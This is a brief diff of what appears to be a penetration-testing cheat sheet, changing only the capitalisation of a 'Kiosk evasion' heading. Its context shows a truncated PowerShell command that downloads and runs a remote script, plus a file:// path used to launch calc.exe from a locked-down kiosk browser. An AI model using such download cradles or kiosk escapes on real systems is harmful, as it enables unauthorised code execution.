@@ -12,7 +12,7 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 ### DIVERS
 *******
-Kiosk evasion : File access from browser or openfile dialogbox
+Kiosk evasion : file access from browser or openfile dialogbox
 ```
 file://c:/windows/system32/calc.exe
 ```
